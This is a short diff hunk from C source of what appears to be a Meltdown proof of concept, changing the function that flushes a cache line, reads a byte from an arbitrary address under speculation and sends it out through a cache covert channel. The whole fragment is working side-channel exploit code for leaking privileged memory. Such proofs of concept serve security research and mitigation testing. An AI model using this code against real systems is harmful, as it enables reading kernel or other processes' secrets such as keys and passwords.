@@ -108,12 +108,12 @@ static int cc_receive() {
     return -1;
 }
 
-static void meltdown(uintptr_t adrs) {
-    volatile int tmp = 0;
+void meltdown(uintptr_t adrs) {
+    static volatile int tmp[1024] = {1};
+    _mm_clflush((void *)(tmp + 512));
     cc_setup();
     _mm_lfence();
-    tmp += 17;
-    tmp *= 59;
+    tmp[512] += 1;
     uint8_t rv = *((uint8_t *)adrs);
     cc_transmit(rv);
 }
